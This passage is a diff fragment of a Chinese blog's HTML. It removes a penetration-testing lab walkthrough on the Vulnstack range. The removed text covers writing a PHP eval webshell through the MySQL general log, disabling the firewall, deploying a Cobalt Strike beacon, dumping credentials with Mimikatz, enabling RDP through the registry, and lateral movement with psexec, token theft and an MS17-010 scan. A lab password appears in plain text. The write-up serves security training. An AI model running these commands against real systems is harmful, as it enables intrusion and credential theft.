-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/hack.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><img src="/2021/05/14/PenetrationRange/18.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/19.png"></p>
-<p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
-<p><img src="/2021/05/14/PenetrationRange/20.png"></p>
-<p>使用蚁剑连接一句话木马<code>http://192.168.140.130/hack.php</code>。web目录直接IP加文件名就好。</p>
-<h2 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h2><p>此时会用到Cobalt Strike, 以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
-<p>我们用kali作为CS服务器，用蚁剑给win7上传java 11和CS。CS服务器和CS客户端分别如下：</p>
-<p><img src="/2021/05/14/PenetrationRange/21.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/22.png"></p>
-<p>选择监听器，为后头生成木马做铺垫</p>
-<p>蚁剑关闭防火墙：终端执行：netsh advfirewall set allprofiles state off</p>
-<p><img src="/2021/05/14/PenetrationRange/23.png"></p>
-<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。发现是监听主机选错了，当然是要选择攻击方(服务器)。当然记得要选择为64位。</p>
-<p>tips:</p>
-<p>相同文件名的shell，蚁剑会上传失败。</p>
-<p><img src="/2021/05/14/PenetrationRange/24.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/25.png"></p>
-<p>终于提权成功了。</p>
-<h2 id="0x04-后渗透之系统信息收集"><a href="#0x04-后渗透之系统信息收集" class="headerlink" title="0x04 后渗透之系统信息收集"></a>0x04 后渗透之系统信息收集</h2><h3 id="1-主机信息收集"><a href="#1-主机信息收集" class="headerlink" title="1.主机信息收集"></a>1.主机信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell ipconfig/all</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/14/PenetrationRange/26.png"></p>
-<p>我们知道140是外网，还发现52网段。域是god.org，说明当前主机是在域内的，初步判断域名为god.org.</p>
-<blockquote>
-<p>内网信息收集：</p>
-<p>查询主机名：whoami，hostname</p>
-<p>查询系统体系架构：echo %PROCESSOR_ARCHITECTURE%</p>
-<p>查看当前运行进程：wmic process list brief</p>
-<p>域相关：</p>
-<p>查询本地所有用户：net user</p>
-<p>查看域内所有用户列表：net group /domain  </p>
-<p>进入域：net group /domain:god</p>
-<p>查看域成员计算机列表：net group “domain computers” /domain<br>查看域管理员用户，也就是域控：net group “domain admins” /domain </p>
-<p>参考：<a target="_blank" rel="noopener" href="https://article.itxueyuan.com/56bEWk">https://article.itxueyuan.com/56bEWk</a></p>
-</blockquote>
-<p>查看本机名，hostname,架构，域信息等，CSshell执行命令实在是太慢了，后来发现是自己没改sleep时间，在Cobalt Strike中，默认心跳为60s，执行命令的响应很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显。主机扫描和端口扫描在beacon处，可直接用。</p>
-<p>查看是否有常见的杀毒软件</p>
-<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/27.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/28.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/29.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/30.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/31.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/32.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/33.png"></p>
-<ul>
-<li><p> 域控制用户：OWA</p>
-</li>
-<li><p>本机计算机：STU1，</p>
-</li>
-<li><p>域成员：ROOT-TVI862UBEH</p>
-</li>
-</ul>
-<h3 id="2-主机密码收集"><a href="#2-主机密码收集" class="headerlink" title="2. 主机密码收集"></a>2. 主机密码收集</h3><p>拿到本机的Administrator权限，先提权，右键Access -&gt; Elevate，提权至System：</p>
-<p><img src="/2021/05/14/PenetrationRange/45.png"></p>
-<p>System权限-&gt;Access-&gt;Run Mimikaz，获取win7系统用户名和密码。这里要注意，如果域控登陆本机，可以直接拿到域控的账户和密码。</p>
-<p>view -&gt; Credentials</p>
-<p><img src="/2021/05/14/PenetrationRange/34.png"></p>
-<h3 id="3-远程桌面登陆"><a href="#3-远程桌面登陆" class="headerlink" title="3.远程桌面登陆"></a>3.远程桌面登陆</h3><p>要使用远程桌面登陆的话，得远程开启对方的3389端口，不妨试试。当然得先关闭防火墙，之前上传shell的时候已经关闭了，所以此时不再需要。CS 右键Explore -&gt; Desktop(VNC)也可以直接远程桌面。</p>
-<p><img src="/2021/05/14/PenetrationRange/35.png"></p>
-<p>whoami的信息是god\administrator，密码是Security1</p>
-<p>此时远程桌面登陆：</p>
-<p><img src="/2021/05/14/PenetrationRange/36.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/37.png"></p>
-<p>尝试多次一直登陆失败，是把用户名记成god，执行whoami看到是god\administrator。</p>
-<blockquote>
-<p>注：</p>
-<p>注册表开启3389端口：<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t  REG_DWORD /d 00000000 /f</p>
-</blockquote>
-<h2 id="0x05-内网主机探测"><a href="#0x05-内网主机探测" class="headerlink" title="0x05 内网主机探测"></a>0x05 内网主机探测</h2><ul>
-<li><p> 域控制用户：OWA</p>
-</li>
-<li><p>本机计算机：STU1，</p>
-</li>
-<li><p>域成员：ROOT-TVI862UBEH</p>
-</li>
-</ul>
-<p>远程登陆之后发现win7已安装nmap，不妨利用起来，直接进行内网扫描。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure>
-
-<p>k8的Ladon也可以直接进行内网扫描：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.52.0&#x2F;24 OnlinePC</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/14/PenetrationRange/38.png"></p>
-<p>扫描端口：beacon上右键-&gt;Explore -&gt; PortScan</p>
-<p><img src="/2021/05/14/PenetrationRange/39.png"></p>
-<p>icmp扫描完之后，在view-&gt;target选项即可看到内网存活主机。</p>
-<p><img src="/2021/05/14/PenetrationRange/40.png"></p>
-<p>总结一下所开放端口，其实target处右键services可以直接看到每个主机所开放的端口。不过还是nmap的比较全.</p>
-<p>138开放端口如下：</p>
-<p><img src="/2021/05/14/PenetrationRange/41.png"></p>
-<p>141开放端口如下：</p>
-<p><img src="/2021/05/14/PenetrationRange/42.png"></p>
-<p>143 <a target="_blank" rel="noopener" href="http://www.qiyuanxuetang.net/">www.qiyuanxuetang.net</a> 开放端口如下：</p>
-<p><img src="/2021/05/14/PenetrationRange/43.png"></p>
-<h2 id="0x06-横向移动拿权限"><a href="#0x06-横向移动拿权限" class="headerlink" title="0x06 横向移动拿权限"></a>0x06 横向移动拿权限</h2><p>目前我们只拿到本机的账户密码和System权限，我们需要去隐秘探测内网的其他主机。</p>
-<p>第一种：Ladon发现</p>
-<p>用Ladon扫描主机及漏洞，可以看到三者都存在MS17-010漏洞</p>
-<p><img src="/2021/05/14/PenetrationRange/44.png"></p>
-<p>第二种：使用SMB beacon</p>
-<p>SMB beacon相对隐秘，对绕过防火墙有奇效。SMB beacon通过命名管道和父Beacon进行通讯。两个Beacons连接之后，父beacon发布任务并传送给子beacon，Beacon之间使用windows命名管道通信，此通信流量封装于SMB协议中。故而相对隐秘。</p>
-<p>新建一个listener，payload设定为Beacon SMB</p>
-<p><img src="/2021/05/14/PenetrationRange/46.png"></p>
-<p>在已有的beacon上右键spawn生成会话，进行派生.选择建立的SMB beacon的listener。选择后会反弹一个子会话：</p>
-<p><img src="/2021/05/14/PenetrationRange/47.png"></p>
-<p>执行psexec有两种方法：</p>
-<p>其一：选择用户登录</p>
-<p>然后psexec使用凭证来登入其他主机。Beacon选择SMB，Listener选择本机128.</p>
-<p>psexec会分别执行rev2self、make_token GOD.ORG\Administrator Security1、jump psexec OWA SMB</p>
-<p><img src="/2021/05/14/PenetrationRange/48.png"></p>
-<p>其二：token窃取</p>
-<p><img src="/2021/05/14/PenetrationRange/50.png"></p>
-<p><img src="/2021/05/14/PenetrationRange/51.png"></p>
-<p>最终得到内网主机的System权限。</p>
-<p><img src="/2021/05/14/PenetrationRange/49.png"></p>
-<h2 id="0x07-CS-MSF联动使用MS17010扫描"><a href="#0x07-CS-MSF联动使用MS17010扫描" class="headerlink" title="0x07 CS-MSF联动使用MS17010扫描"></a>0x07 <strong>CS-MSF联动使用MS17010扫描</strong></h2><p>通过beacon内置的socks功能将本地Msf直接代入目标内网进行操作即可。socks 1080。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks4:127.0.0.1:1080</span><br><span class="line">setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/05/14/PenetrationRange/52.png"></p>
-<p>同样拿到权限。</p>
-<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>1，CS的Beacon后自带四个点，说明是通过代理服务器获得的控制权限。</p>
-<h1 id="4-reference"><a href="#4-reference" class="headerlink" title="4.reference"></a>4.reference</h1><p>CS教程参考：<a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/204574">https://bbs.huaweicloud.com/blogs/204574</a></p>
-<p><a target="_blank" rel="noopener" href="https://iter01.com/598439.html">https://iter01.com/598439.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/231111.html">https://www.freebuf.com/column/231111.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://chaceshadow.github.io/2020/09/28/ATC-CK-Vulnstack-1/#3-2-1-6-%E6%BC%8F%E6%B4%9E%E5%85%AD%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell">https://chaceshadow.github.io/2020/09/28/ATC-CK-Vulnstack-1/#3-2-1-6-%E6%BC%8F%E6%B4%9E%E5%85%AD%EF%BC%9APhpMyAdmin%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p>
 
       
     </div>
@@ -1660,7 +1678,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-count">49</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -1708,12 +1726,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">74k</span>
+    <span title="站点总字数">73k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:07</span>
+    <span title="站点阅读时长">1:06</span>
 </div>
 
         
